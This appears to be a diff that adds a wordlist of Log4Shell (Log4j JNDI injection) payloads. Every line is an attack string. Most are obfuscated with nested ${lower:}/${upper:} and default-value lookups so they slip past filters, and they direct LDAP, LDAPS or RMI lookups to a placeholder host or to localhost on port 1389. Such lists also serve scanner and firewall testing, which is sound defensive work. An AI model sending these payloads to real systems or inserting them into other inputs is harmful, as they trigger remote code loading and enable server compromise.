@@ -1,0 +1,10 @@
+${VWegfRIPvF:-jndi:ldap://100.200.300.400:1389/tes}${iTZDZZM:gS:-t}
+${fuZJ:HPSMr:-jndi:rm}i://100.200.300.400:1389/${Snp:UVhVEy:-te}${bV:ZsoF::::-s}t
+jn${pIlXdzO:fK:-di:ldap://100.200.300.400:1389/tes}t
+${lower:j}${upper:n}${lower:d}${lower:i}${lower::}${lower:l}${lower:d}${lower:a}${upper:p}${upper::}${lower:/}${upper:/}${lower:1}27.0${upper:.}${lower:0}${lower:.}${upper:1}${upper::}${upper:1}${upper:3}8${upper:9}${lower:/}${lower:t}${lower:e}${lower:s}${lower:t}
+${lower:j}n${upper:d}${lower:i}${upper::}${upper:l}${upper:d}${lower:a}${upper:p}${upper::}${lower:/}${lower:/}${upper:1}${upper:2}${lower:7}${lower:.}${upper:0}${upper:.}${upper:0}${lower:.}1${upper::}${lower:1}${upper:3}${lower:8}${upper:9}${upper:/}${upper:t}${upper:e}${upper:s}${lower:t}
+${lower:j}${lower:n}d${lower:i}${upper::}${upper:l}${lower:d}${upper:a}${lower:p}:${lower:/}${lower:/}${upper:1}${upper:2}${upper:7}${lower:.}${upper:0}.${upper:0}${lower:.}${lower:1}${lower::}${upper:1}38${upper:9}${upper:/}${upper:t}${lower:e}${upper:s}${upper:t}
+${lower:j}${upper:n}${lower:d}${upper:i}${lower::}${upper:l}${lower:d}${upper:a}p://1${upper:2}${lower:7}${upper:.}0${lower:.}${lower:0}.${upper:1}${upper::}${lower:1}${lower:3}${lower:8}${upper:9}${lower:/}${upper:t}e${upper:s}${lower:t}
+jndi:ldaps://100.200.300.400:1389/test
+jndi:ldaps://100.200.300.400:1389/test
+jndi:ldap://100.200.300.400:1389/test
